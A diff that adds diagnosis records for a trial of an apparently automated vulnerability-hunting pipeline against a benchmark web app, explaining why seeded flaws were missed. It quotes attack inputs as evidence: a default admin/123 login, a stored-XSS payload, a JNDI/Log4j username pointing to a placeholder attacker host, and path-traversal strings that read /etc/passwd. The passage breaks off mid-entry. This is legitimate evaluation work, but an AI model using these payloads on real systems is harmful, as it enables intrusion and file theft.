@@ -1,0 +1,447 @@
+# Diagnoses for trial white-jotter-1-20261028T083326-1618c524.
+# One entry per missed/partial verdict (white-jotter-001, -003, -004, -006, -007),
+# paired with verdicts.yaml. Identity (eval_sha, stack_fingerprint) is copied
+# verbatim from the trial record.
+#
+# The issue bank was unavailable for this dispatch: EVAL_GITHUB_TOKEN is unset
+# and `python3 -m orchestrator issue-search` refuses with "EVAL_GITHUB_TOKEN is
+# not set; the issue-bank search cannot authenticate". Every row therefore
+# carries a proposed_issue for the operator instead of a closest_issue.
+#
+# trace_id is null in the trial record, so no observability-platform trace was
+# available; every finding is grounded on the persisted hunting artifacts, the
+# hunting run row, the trial record, and the code, skill and design docs.
+
+- vuln: white-jotter-001
+  failure_mode: modeller_failed_unit-fault_binding
+  root_cause:
+    type: skill_defect
+    combination_of: [design_defect]
+    extended_description: |-
+      The ground truth is the shipped default administrator credential: POST /api/login with admin/123 grants a sysAdmin session (white-jotter-001/metadata.json, report.md and exploits/exploit.py).
+
+      Service:sign-in owns the only credential-verification path and completed valid this run. Its vulnerability set is V-1 positive authentication verdict without a principal, V-2 session identifier carried across the authentication boundary, V-3 account-identity canonicalisation at sign-in, V-4 account enumeration, V-5 remember-me deserialization and V-6 cross-site sign-out. V-3 does carry web_vulnerability_class weak-credential-discovery, but its fault is the case-folded lookup (RP_PROBE_1 authenticating rp_probe_1), not a shipped default pair. Its four threats are username-enumeration-oracle, session-management, insecure-deserialization and csrf-navigation-get. No vulnerability, threat or precursor binds a published default credential, and the shipped database seed admin/123 is never submitted as a candidate.
+
+      This is procedural drift in the modeller pass, not missing knowledge. The class tree ships skills/web-vulnerability-testing/weak-credential-discovery/default-credential-replay/SKILL.md, whose reconnaissance step is "submit vendor and framework default pairs to every authentication acceptor and read the success signal", and the parent skill repeats "Default-pair submission". The Service-sign-in trust-mapping note explicitly leaves the class unverified: "TA-8 (stored-credential strength) is retained unverified - the matcher class is observed, its parameters are not". The wellformedness note lists the four classes it loaded and none is weak-credential-discovery or its default-credential-replay leaf.
+
+      The symptom nevertheless reached a pod and was discarded. Inside AuthenticationMechanism__threat-1 the session-management__status-change__third-party pod used the shipped pair as a setup step: probe 44ff02978695f723 sends POST /api/login {"username":"admin","password":"123"} and reads HTTP 200 {"code":200,"message":"成功","result":"admin"} with a fresh JSESSIONID, while the wrong-credential control reads 账号不存在. The pod's triager interpretation is scoped to the third-party account-status change (session-management), so the accepted default pair stayed a setup observation and never became a finding.
+
+      The design reinforces the miss: auth/credentials.yaml holds username admin, password 123, origin operator, with the note "Seed administrator from the shipped database script (username admin, password 123 per the project README)". The ground-truth credential is the pipeline's own working material, so it reads as legitimate context rather than as a target-side fault.
+  diagnosis_overview: |-
+    white-jotter-001 is the shipped default administrator pair admin/123 at POST /api/login.
+    Service:sign-in completed and bound six vulnerabilities to the login acceptor but none is a shipped default credential; V-3 uses the weak-credential-discovery class for a case-fold identity gap instead, and the unit's own trust-mapping note leaves "stored-credential strength ... unverified".
+    The class existed: weak-credential-discovery/default-credential-replay mandates a default-pair submission on every acceptor. The leaf was never loaded for the unit, so this is class-selection and fault-binding drift, not a knowledge gap.
+    A pod did submit admin/123 and read code 200 result "admin" (with a wrong-credential control), but the spec and triager were scoped to session-management, so the accepted pair was recorded as setup and never as a finding.
+    Typed root cause: a modeller class-selection and fault-binding defect (skill_defect), reinforced by the auth bootstrap that presents the ground-truth credential as legitimate material (design_defect).
+  evidences:
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-001/metadata.json
+    note: |-
+      Location http://wj:8443/api/login, Vulnerability Type "Weak or Default Credentials".
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-001/report/report.md
+    note: |-
+      Log in with username admin and password 123 and reach the back office; exploits/exploit.py performs the same pair.
+  - source: threat_model
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/consumed/Service-sign-in/Service-sign-in.yaml
+    note: |-
+      COMPLETED, valid. V-3 carries web_vulnerability_class weak-credential-discovery but binds the case-fold identity gap; the four threats are enumeration, session-management, insecure-deserialization and csrf-navigation-get. No default-credential fault or threat.
+  - source: threat_modeller_notes
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/notes.yaml
+    note: |-
+      Service-sign-in:trust-mapping says "TA-8 (stored-credential strength) is retained unverified - the matcher class is observed, its parameters are not"; wellformedness lists session-management, username-enumeration-oracle, insecure-deserialization and csrf-navigation-get as loaded.
+  - source: experiment_log
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/test-executor-pod/session-management__status-change__third-party/experiment-log/0.yaml
+    note: |-
+      Probe 44ff02978695f723: POST /api/login admin/123 returns HTTP 200 {"code":200,"message":"成功","result":"admin"} with a fresh JSESSIONID and rememberMe; the wrong-credential control returns {"code":400,"message":"账号不存在","result":null}.
+  - source: pod_export
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/test-executor-pod/session-management__status-change__third-party/aac5ecac-f119-4e26-9f21-fc259153ccf3.yaml
+    note: |-
+      Verdict successful, symptom-confirmed; the single interpretation classifies the third-party account-status change, not default credentials, so the confirmed admin/123 login is not reported.
+  - source: auth_store
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/auth/credentials.yaml
+    note: |-
+      admin-first_authn_bootstrap: username admin, password 123, origin operator, note "Seed administrator from the shipped database script (username admin, password 123 per the project README)". The GT credential is the pipeline's own bootstrap material.
+  - source: skill
+    ref: skills/web-vulnerability-testing/weak-credential-discovery/default-credential-replay/SKILL.md
+    note: |-
+      The leaf's reconnaissance requires a default-pair submission on every authentication acceptor and its success predicate is session marker or navigational arrival. The class was available and never applied to the sign-in unit.
+  closest_issue: null
+  proposed_issue:
+    title: "Make the shipped default credential a mandatory fault on the sign-in unit (admin/123 at /api/login)"
+    body: |-
+      ## Observed
+      In trial white-jotter-1-20261028T083326-1618c524 (project fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5) Service:sign-in completed with six vulnerabilities, none a shipped default credential. V-3 uses web_vulnerability_class weak-credential-discovery but binds the case-folded lookup, and the unit's trust-mapping note leaves "stored-credential strength" unverified.
+
+      The class exists (`skills/web-vulnerability-testing/weak-credential-discovery/default-credential-replay/SKILL.md` requires a default-pair submission on every acceptor) and was never loaded for the unit. A pod in AuthenticationMechanism__threat-1 (session-management__status-change__third-party) did submit admin/123 and read HTTP 200 result "admin" while the wrong-credential control read 账号不存在, but its spec and triager were scoped to session-management, so the accepted pair never became a finding.
+
+      The operator auth bootstrap (`auth/credentials.yaml`) holds the same admin/123 pair with the note that it is the shipped database seed, which makes the ground-truth credential read as legitimate material.
+
+      ## Impact
+      The one GT vulnerability scored only partial: the pair was observed but never classified as weak-or-default credentials, so no threat, spec or finding owns it.
+
+      ## Proposed direction
+      1. Make a default-pair submission a required step for any unit that models a credential-verification acceptor, with the shipped seed pair as the candidate.
+      2. Bind weak-credential-discovery to the default-pair fault explicitly when the login acceptor answers an authentication-success signal, instead of reusing the class for a case-fold identity gap.
+      3. When a pod submits a shipped default pair and reads a success signal, promote that observation to the triager as its own candidate symptom even when the spec's primary class is different.
+      4. Mark the operator auth-bootstrap credential as target-side material in the modeller context so it is not read as legitimate context.
+    labels: [bug, needs-triage]
+  eval_sha: 5cadea78d4a4b8a88bf5284f29db14f29f1690ac
+  stack_fingerprint: 84d14309e4c4c4ebd9706f890f7bf04455e1068efb2ab9dfff8cc4a4d707b6e0
+
+- vuln: white-jotter-003
+  failure_mode: hunter_notsufficient_tests_exploration
+  root_cause:
+    type: design_defect
+    combination_of: [implementation_defect]
+    extended_description: |-
+      The ground truth is stored cross-site scripting in article content: an account with article-write privilege saves articleContentHtml carrying script and the article detail page renders it as raw HTML; the report payload is <img src=x onerror=alert('test')> (white-jotter-003/metadata.json and report.md).
+
+      This iteration did model the owning unit and bind the right fault. Service:article-management COMPLETED at 2026-10-27T23:26:47Z with V-1 xss-stored, F-1 "stored cross-site scripting through the article rendered body", and threat-1 (web_vulnerability_class xss-stored, likelihood medium, risk 6). The model proves the channel end to end: a supplied HTML fragment is stored byte-identically and returned to an anonymous reader of /api/article/{id}, and the reading view binds articleContentHtml to innerHTML with no sanitiser and no content policy; the writer account is obtainable through the registration over-binding. Risk 6 is above the run's promotion threshold 4, so the threat was dispatchable.
+
+      No test spec or pod was ever created for it. hunting/hunter/test-specs holds 12 dispatch directories for exactly six units (ReverseProxy, RESTApi-api, Service-sign-in, Service-library-catalog, Service-register, AuthenticationMechanism); there is no Service-article-management__threat-1 directory and no pod for that spec id. The article threat sat in produced/ for the rest of the run.
+
+      The cause is dispatch throughput under the run's frozen batched policy. pipeline_sync.py documents `batched` as one unit at a time in risk order after the modeller pass settles, its whole hunter batch concurrently, then its pods, then the next unit. The run's own model_sums give the queue: ReverseProxy 33, RESTApi:api 21, Service:sign-in 19, Service:library-catalog 11, Service:register 11, AuthenticationMechanism 10, then IdentificationSystem 6, Service:article-management 6, Service:jotter-reading 6, RESTApi:actuator-management 6, Service:operations-telemetry 6. The dispatched set is exactly the top six units; Service:article-management is eighth by risk and fifth by intake position among the risk-6 group, and the run never reached it.
+
+      The throughput cost is the pod watchdog. 17 of the run's 47 PodExports carry terminal_reason pod-watchdog-timeout, and the surfer's per-pod window is 3600 s (DEFAULT_POD_SESSION_TIMEOUT_S), so each unit wave lasted between roughly 1.5 and 4 hours: ReverseProxy at 01:49 to 02:00, RESTApi:api at 05:30, Service:sign-in at 07:25, Service:library-catalog at 10:26, Service:register at 11:56, AuthenticationMechanism at 13:09 to 13:15. Six units in about 13 hours.
+
+      The run was then stopped on the trial's 7,000,000 capped-token budget. The monitor recorded 7,003,931 capped tokens at 14:45:17 and status stopped with stop_issued true at 14:47:24, and the hunting_runs row finishes at 14:45:24. The trial record itself had already stamped hunting stopped at 08:33:26 with spent_tokens 4,940,868 and no overshoot, while the same run row continued to 14:45; the trial therefore reported an execution success while the run still held seven promoted, never-dispatched units. Either way, the batched unit barrier and the watchdog-dominated pod phase exhausted the budget before the article unit was reached.
+  diagnosis_overview: |-
+    white-jotter-003 is stored XSS through articleContentHtml at /api/admin/content/article.
+    Service:article-management was fully modelled with V-1 xss-stored, F-1 and threat-1 (risk 6, above the promotion threshold 4), and the write channel plus the anonymous read were proven.
+    No test spec or pod was ever created: the 12 dispatch directories cover exactly six units, and Service:article-management is the eighth unit in the batched risk queue.
+    The batched policy runs one unit at a time in risk order; the six dispatched units are the top six by risk. Each unit wave cost hours because 17 of 47 pod exports hit the 3600 s watchdog, and the run then stopped on the 7,000,000 capped-token budget at 14:45, with seven promoted threats still in produced/.
+    The trial record's own terminal (stopped at 08:33 with 4,940,868 capped tokens) preceded the run's budget stop and was treated as a successful execution.
+    Typed root cause: a design defect in dispatch throughput (the batched unit barrier plus a pod window that most pods consume), combined with an implementation defect in the pod terminal path (watchdog finalisation is the normal path, not a backstop).
+  evidences:
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-003/metadata.json
+    note: |-
+      Location http://wj:8443/api/admin/content/article, Vulnerability Type "Stored XSS".
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-003/report/report.md
+    note: |-
+      Store <img src=x onerror=alert('test')> in the article body and it runs when a reader opens the article detail page.
+  - source: threat_model
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/produced/Service-article-management/Service-article-management.yaml
+    note: |-
+      COMPLETED, valid. V-1 xss-stored, F-1 persisted rendered body emitted verbatim with no output encoding; the anonymous read returns the stored HTML and the detail view binds it to innerHTML.
+  - source: threat
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/produced/Service-article-management/threat-1.yaml
+    note: |-
+      threat-1, web_vulnerability_class xss-stored, likelihood medium, risk 6; promoted by the run's promotion_risk_threshold 4.
+  - source: data_root
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/hunter/test-specs
+    note: |-
+      12 dispatch directories for exactly six units (AuthenticationMechanism, RESTApi-api, ReverseProxy, Service-library-catalog, Service-register, Service-sign-in); no Service-article-management__threat-1 directory exists, so the threat never received a spec.
+  - source: data_root
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/test-executor-pod
+    note: |-
+      47 PodExports; 17 carry terminal_reason pod-watchdog-timeout. The longest unit waves consumed the 3600 s per-pod window.
+  - source: hunting_run
+    ref: postgres:hunting_runs/aac5ecac-f119-4e26-9f21-fc259153ccf3
+    note: |-
+      status stopped, started 2026-10-27T21:53:51Z, finished 2026-10-28T14:45:24Z; stats pipeline_sync batched, pod_batch_size 1, promotion_risk_threshold 4, risk_threshold 180, risk_total 150, halt false, intake_position 27, intake_order names Service:article-management ninth; model_sums give it risk 6 after the six dispatched units.
+  - source: trial_record
+    ref: /opt/polymerhus-dev/eval/runs-iteration-d-20261027/white-jotter-1/white-jotter-1-20261028T083326-1618c524/trial.yaml
+    note: |-
+      terminal stopped; hunting status stopped; token_budget 7000000, spent_tokens 4940868, spend_overshoot null, spend_baseline 0, usage snapshot present. The record's finished_at 08:33:26 precedes the run row's 14:45:24 finish.
+  - source: run_log
+    ref: /opt/polymerhus-dev/eval/runs-iteration-d-20261027/monitor.jsonl
+    note: |-
+      The run is still "running" at 2026-10-28T08:33:47Z (capped_tokens 4,940,868) and at 14:45:17Z reports capped_tokens 7,003,931; the next row is status stopped with stop_issued true.
+  - source: code
+    ref: eval/instances/eval-server-1/src/polymerhus/attack/hunting/pipeline_sync.py
+    note: |-
+      The module docstring defines `batched` as "one unit at a time in risk order, its whole hunter batch concurrently, then its pods ... then the next unit"; _decide_batched admits only the current unit's items.
+  - source: code
+    ref: eval/instances/eval-server-1/src/polymerhus/attack/hunting/surfer.py
+    note: |-
+      DEFAULT_POD_SESSION_TIMEOUT_S = 3600.0 (line 220); on asyncio.TimeoutError the surfer finalizes the pod with PodTerminal.infrastructure(reason=POD_WATCHDOG_TIMEOUT), which is always verdict unsuccessful and clean False.
+  - source: design_doc
+    ref: eval/instances/eval-server-1/docs/design/hunting-pipeline-sync-adr.md
+    note: |-
+      The operator-ratified ADR defines the `batched` phase barriers (modeller settles first, then one unit at a time in risk order) and adds pod_batch_size and promotion_risk_threshold; it records no budget-aware widening of the unit barrier.
+  closest_issue: null
+  proposed_issue:
+    title: "Batched hunting reaches only six of 13 promoted units; the stored-XSS threat is never dispatched"
+    body: |-
+      ## Observed
+      In trial white-jotter-1-20261028T083326-1618c524 (project fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5) Service:article-management was modelled with V-1 xss-stored, F-1 and threat-1 (risk 6, above promotion_risk_threshold 4), and the model proves both the write channel and the anonymous innerHTML read. No test spec or pod was ever authored: `hunting/hunter/test-specs` holds 12 dispatch directories for exactly six units and no `Service-article-management__threat-1` directory.
+
+      The run is frozen `batched`, which dispatches one unit at a time in risk order after the modeller settles. The six dispatched units are the top six by model risk (ReverseProxy 33, RESTApi:api 21, Service:sign-in 19, Service:library-catalog 11, Service:register 11, AuthenticationMechanism 10); Service:article-management (risk 6, eighth) was never reached. Each unit wave cost 1.5 to 4 hours because 17 of 47 pod exports ran to the 3600 s watchdog. The run then stopped on the 7,000,000 capped-token budget at 14:45:24 with seven promoted threats still in `produced/`.
+
+      The trial record had already stamped the hunting phase stopped at 08:33:26 with 4,940,868 capped tokens and no overshoot, while the run row continued to 14:45; a stopped terminal with dispatchable produced threats was treated as a successful execution.
+
+      ## Impact
+      A fully modelled, promoted, high-value stored-XSS channel produced no hunter work at all. Seven promoted units and seven promoted threats were never explored, and the harness scored the truncation as a success.
+
+      ## Proposed direction
+      1. Make the `batched` unit barrier budget-aware: widen it, or weigh unit cost, so one or two expensive units cannot consume the whole trial.
+      2. Make pods conclude instead of running to the 3600 s watchdog; 17 of 47 exports hit it, so the watchdog is the normal path rather than a backstop.
+      3. Add a coverage ledger to the run terminal: every promoted produced threat must have a terminal spec, an explicit drop, or a named un-dispatched reason.
+      4. Treat a stopped hunting terminal with dispatchable produced threats as an unsuccessful execution; resume it before assessment rather than scoring the coverage loss as a success.
+      5. Reconcile the trial record's terminal with the hunting run's own finish so the two do not disagree by six hours.
+    labels: [bug, needs-triage]
+  eval_sha: 5cadea78d4a4b8a88bf5284f29db14f29f1690ac
+  stack_fingerprint: 84d14309e4c4c4ebd9706f890f7bf04455e1068efb2ab9dfff8cc4a4d707b6e0
+
+- vuln: white-jotter-004
+  failure_mode: modeller_failed_unit-fault_binding
+  root_cause:
+    type: kb_coverage_gap
+    combination_of: [design_defect]
+    extended_description: |-
+      The ground truth is a JNDI injection through a crafted username. The exploit registers an account whose username is ${jndi:rmi://<attacker-host>:<port>/<name>} at /api/register, signs in, then requests /api/admin/user; the server writes the caller-controlled username to its log through a vulnerable Log4j2 configuration, the logging framework resolves the lookup against the attacker's service, and verify/verify.py observes the shared RCE canary (white-jotter-004/metadata.json, report.md, exploits/exploit.py, verify/verify.py). The GT location /api/admin/user is the unauthorized access that triggers the logged username.
+
+      Both owning units were modelled this run and neither binds a logging sink, a lookup evaluation or a caller-controlled log field. Service:register's vulnerabilities are V-1 concurrent duplicate account creation, V-2 account-name canonicalisation collision and V-3 credential policy enforcing non-emptiness only; its threats are threat-1 (concurrent-duplication, risk 9) and threat-2 (business-logic, risk 2). Service:user-administration's only vulnerability is V-1 "account writes operating blind against a name while the only read of the table is dead" (business-logic) and it produced zero threats; the unit's completion note records the dead roster as a structural availability precursor and never touches a logging path.
+
+      A case-insensitive search of the whole hunting tree (threat models, notes, specs, pod logs) for jndi, log4j or log4shell returns nothing, and no spec or pod registers a JNDI-shaped username or requests /api/admin/user with one.
+
+      The suite has no class for this chain. skills/web-vulnerability-testing/rce/ contains only rce-command-injection and rce-pipeline-execution; a search of skills/ for jndi, log4j or log4shell finds no leaf, and the ldap-injection parent is a different sink. The knowledge base therefore cannot bind "caller-controlled username -> log record -> JNDI lookup" even in principle.
+
+      A design gap compounds it: neither the unit projection nor the technical-sharpening step inventories the logging dependency. The application declares spring-boot-starter-log4j2 in pom.xml and ships src/main/resources/log4j2.xml, but no unit model records the logging framework, its version, or which caller-controlled values reach it. The RCE family asks for a dependency inventory where the runtime is identifiable; that step was never applied to the logging stack.
+
+      The dispatch starvation also applies to these units (Service:user-administration has no threat to dispatch; Service:register's threat-2 is demoted at risk 2), but even a dispatched register threat would not seek a logging lookup. The GT miss is the unbound fault and the absent class.
+  diagnosis_overview: |-
+    white-jotter-004 is a JNDI/Log4j2 RCE: register username ${jndi:rmi://...}, sign in, access /api/admin/user, and the server logs the username through a vulnerable Log4j2 and contacts the attacker's lookup service; the verifier checks the shared RCE canary.
+    Both owning units were modelled this run (Service:register and Service:user-administration), but neither binds a logging-sink fault: register's vulnerabilities are duplicate creation, name canonicalisation and credential policy, and user-administration's is the dead roster. No model, threat, spec, pod or note mentions JNDI, log4j or Log4Shell.
+    The suite has no logging-sink/JNDI class: the rce family holds only command injection and pipeline execution, and a search of skills/ for jndi or log4j finds no leaf. The KB cannot bind the chain even in principle.
+    The application declares spring-boot-starter-log4j2 and ships log4j2.xml, but no unit inventories the logging framework or which caller-controlled fields reach it.
+    Typed root cause: a knowledge-base coverage gap for a logging-sink JNDI lookup (kb_coverage_gap), combined with a design gap that never inventories the logging stack (design_defect).
+  evidences:
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-004/metadata.json
+    note: |-
+      Location http://wj:8443/api/admin/user, Vulnerability Type "Remote Code Execution"; the report names a vulnerable Log4j2 configuration and a JNDI lookup expression in the username.
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-004/exploits/exploit.py
+    note: |-
+      Registers username ${jndi:rmi://<host>:<port>/<name>} with password 111 via POST /api/register, signs in, then GET /api/admin/user; the lookup lands from the logged username.
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-004/verify/verify.py
+    note: |-
+      verify_rce_effect checks the shared RCE canary, so the GT is code execution, not only an outbound request.
+  - source: threat_model
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/consumed/Service-register/Service-register.yaml
+    note: |-
+      COMPLETED, valid. V-1 duplicate account creation, V-2 account-name canonicalisation collision, V-3 credential policy; threats threat-1 concurrent-duplication (risk 9) and threat-2 business-logic (risk 2). No logging, lookup or username-in-log fault.
+  - source: threat_model
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/consumed/Service-user-administration/Service-user-administration.yaml
+    note: |-
+      COMPLETED, valid, threats: []. V-1 is the account writes operating blind against a name while the only roster read is dead (business-logic); no logging-sink fault.
+  - source: threat_modeller_notes
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/notes.yaml
+    note: |-
+      Service-user-administration:completion records the dead roster and the structural split-brain; Service-register:completion records the duplicate-account race. Neither note records the logging framework or a caller-controlled log field.
+  - source: data_root
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting
+    note: |-
+      A case-insensitive search of the entire hunting tree for jndi, log4j or log4shell returns no match in any model, threat, spec, pod export or note; no spec registers a JNDI-shaped username.
+  - source: skill
+    ref: skills/web-vulnerability-testing/rce/
+    note: |-
+      The RCE family holds rce-command-injection and rce-pipeline-execution only; a search of skills/ for jndi, log4j or log4shell finds no leaf, so there is no class to bind the logging-sink lookup.
+  - source: target_source
+    ref: /root/WebExploitBench/white-jotter/setup_files/codebase/white-jotter/wj/pom.xml
+    note: |-
+      Declares spring-boot-starter-log4j2 (line 46) and the application ships src/main/resources/log4j2.xml, but no unit model records the logging framework, its version, or the caller-controlled values that reach it.
+  - source: l1_surface
+    ref: /opt/polymerhus-dev/eval/data/webexploitbench/white-jotter/l1-surface.yaml
+    note: |-
+      Service:register creates a self-service account from the submitted name and Service:user-administration administers the roster; both contracts are in the seeded surface, so the gap is the fault binding and class, not an absent unit.
+  closest_issue: null
+  proposed_issue:
+    title: "Add a logging-sink JNDI lookup class and inventory the logging dependency on the owning units"
+    body: |-
+      ## Observed
+      In trial white-jotter-1-20261028T083326-1618c524 (project fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5) both units that own the JNDI/Log4j2 chain were modelled: Service:register (duplicate creation, name canonicalisation, credential policy) and Service:user-administration (the dead roster, zero threats). Neither binds a logging sink or a lookup evaluation, and a case-insensitive search of the entire hunting tree for JNDI, log4j or Log4Shell finds nothing.
+
+      The suite has no class for the chain: `skills/web-vulnerability-testing/rce/` holds only `rce-command-injection` and `rce-pipeline-execution`, and no jndi/log4j leaf exists. The application declares `spring-boot-starter-log4j2` and ships `log4j2.xml`, but no unit inventories the logging framework or which caller-controlled fields reach it.
+
+      The GT exploit registers username `${jndi:rmi://<attacker>/<name>}` at /api/register, signs in, then GET /api/admin/user; the lookup lands from the logged username and the verifier checks the shared RCE canary.
+
+      ## Impact
+      white-jotter-004 is unreachable for the modeller: there is no class to bind the username-to-log-to-lookup chain, and no inventory step that would surface the logging dependency. The unit-level faults found instead (duplicate registration, dead roster) are real but do not reach the GT flow.
+
+      ## Proposed direction
+      1. Add a logging-sink / JNDI lookup variant to the suite (Log4j2 lookup evaluation, attacker-controlled log fields, callback oracle, dependency and version fingerprint).
+      2. In the RCE dependency-inventory step, require the logging framework and version whenever the application declares one (spring-boot-starter-log4j2 here).
+      3. Require a crafted-username probe with a callback listener at registration or login plus an unauthorized admin access, whenever a request-derived name reaches a logging framework.
+      4. Record caller-controlled log fields as a data-flow edge on the owning unit models.
+    labels: [bug, needs-triage]
+  eval_sha: 5cadea78d4a4b8a88bf5284f29db14f29f1690ac
+  stack_fingerprint: 84d14309e4c4c4ebd9706f890f7bf04455e1068efb2ab9dfff8cc4a4d707b6e0
+
+- vuln: white-jotter-006
+  failure_mode: modeller_failed_unit-fault_binding
+  root_cause:
+    type: skill_defect
+    combination_of: [design_defect]
+    extended_description: |-
+      The ground truth is a path traversal and arbitrary file read at /api/file/. The deployed handler is LibraryController.readCoverFile (setup_files/environment/inserted_vulns/white-jotter-upload-file-read-traversal.patch): it takes the path within the handler mapping, strips /api/file/, runs URLDecoder.decode twice, joins the result to the upload directory with new File(uploadDir, decodedName) and returns an empty 404 when the target is not a file. The GT exploit reads /etc/passwd with the double-encoded separator payload ..%252f..%252f..%252fetc%252fpasswd.
+
+      This run bound the fault to ReverseProxy rather than to the media unit, but left it a precursor. ReverseProxy V-4 is path traversal in a filesystem-backed handler with fault F-4 and assumption A-4 (confidence ASSUMED); the impact row IA-24 marks the capability P-5 "read a file outside the declared image root" as a precursor, and no ReverseProxy threat covers it. The traversal probes taken were ..;/..;/..;/windows/win.ini, ..%5c..%5cwindows%5cwin.ini, %2e%2e%5c, %252e%252e%255c, ....//....//windows/win.ini and %2e%2e/%2e%2e; they returned 400 from the container or a zero-length 404 from the handler, and the model closed the containment as "uncalibrated rather than proven" because the published cover name k09g2r.png returns 404, so no in-root control file exists.
+
+      The loaded skill's methodology was not executed to the shapes it names. The traversal-read leaf requires separator, encoding and repeated-decoding shapes, and the family's references/traversal-encoding-matrix.md names double percent-encoding "where the front-end decodes to a second encoding that the application decodes again". The one shape the GT uses is a literal dot segment with a double-encoded forward slash (..%252f). The model tried a double-encoded dot plus backslash and a double-encoded dot shape, but never the literal-dot, double-encoded forward-slash separator. Its own control-flow note records the miss: "a double-encoded one reaches the handler literally and is simply not found".
+
+      Service:media-asset-serving, the unit that owns the namespace, explicitly refused to re-open the traversal hunt: "ReverseProxy V-4 owns the traversal and IA-24 the capability", and it ran only one plain and two encoded shapes to confirm the shared result. It also recorded the handler as LibraryController.readCoverFile (correctly, against V-4's ResourceHttpRequestHandler), noted that a hand-written reader carries "whatever its author wrote", and still closed with zero threats because the handler returns the same miss for every name. Its TA-1 says the containment is "neither held nor broken on the evidence available" and that "no in-root control file exists to calibrate a masked read".
+
+      The design compounds it: a precursor is a capability entity, not a threat, and only threats produce hunter work. A live read primitive can therefore close as an ASSUMED precursor with zero threats and zero probes whenever the service publishes no resolvable in-root file, which is exactly this target.
+  diagnosis_overview: |-
+    white-jotter-006 is a path traversal and arbitrary file read at /api/file/, implemented by LibraryController.readCoverFile, which double-decodes the path segment and joins it to the upload directory without containment; the GT exploit reads /etc/passwd with `..%252f..%252f..%252fetc%252fpasswd`.
+    This run bound the fault to ReverseProxy V-4/F-4 at ASSUMED standing and filed it as the IA-24/P-5 precursor, so it never became a threat. Service:media-asset-serving, which owns the namespace, refused to re-open the hunt and closed with zero threats.
+    The loaded traversal-read methodology requires repeated-decoding shapes including the double-encoded separator, but the probes used double-encoded dots and backslashes and never the literal-dot, double-encoded forward-slash form that carries the GT read. The published cover name returns 404, so the units also lacked the in-root control the leaf requires and treated the containment as uncalibrated.
+    Typed root cause: procedural drift in the traversal-read execution (skill_defect), combined with a design that lets an ASSUMED precursor close a live read primitive with zero threats and no hunter work (design_defect).
+  evidences:
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-006/metadata.json
+    note: |-
+      Location http://wj:8443/api/file/, Vulnerability Type "Arbitrary File Read".
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-006/exploits/exploit.py
+    note: |-
+      FILE_READ_PAYLOAD defaults to `..%252f..%252f..%252fetc%252fpasswd` and is appended to /api/file/.
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/setup_files/environment/inserted_vulns/white-jotter-upload-file-read-traversal.patch
+    note: |-
+      Adds @GetMapping("/api/file/**") readCoverFile: strips the prefix, decodeTwice(fileName), new File(uploadDir, decodedName), and ResponseEntity.notFound() (empty 404) when the target is not a file.
+  - source: threat_model
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/consumed/ReverseProxy/ReverseProxy.yaml
+    note: |-
+      V-4 is path traversal in a filesystem-backed handler (path-traversal-lfi-rfi) with F-4/A-4 at confidence ASSUMED; IA-24 files the read-outside-the-root capability as precursor P-5. The recorded probes are ..;/..;/..;/windows/win.ini, ..%5c..%5cwindows%5cwin.ini, %2e%2e%5c, %252e%252e%255c, ....//....//windows/win.ini and %2e%2e/%2e%2e; none is the literal-dot double-encoded forward slash.
+  - source: threat
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/produced/ReverseProxy/threat-4.yaml
+    note: |-
+      The only extra ReverseProxy threat this run is header-injection (risk 3, demoted by promotion_risk_threshold 4); no traversal threat exists.
+  - source: threat_model
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/consumed/Service-media-asset-serving/Service-media-asset-serving.yaml
+    note: |-
+      COMPLETED, threats: []. Its mapping confirms GET /api/file/** -> LibraryController.readCoverFile; TA-1 says the containment is "neither held nor broken on the evidence available" and no in-root control exists; CF-4 records that a double-encoded shape "reaches the handler literally and is simply not found".
+  - source: threat_modeller_notes
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/threat_modeller/notes.yaml
+    note: |-
+      Service-media-asset-serving:completion: "I refused to re-open the traversal hunt: ReverseProxy V-4 owns the traversal and IA-24 the capability", and the handler resolves no name so a masked read cannot be told from a correct refusal.
+  - source: data_root
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/hunter/test-specs
+    note: |-
+      No Service-media-asset-serving dispatch directory and no ReverseProxy__threat-5 traversal dispatch exist; the traversal capability produced no spec and no pod.
+  - source: skill
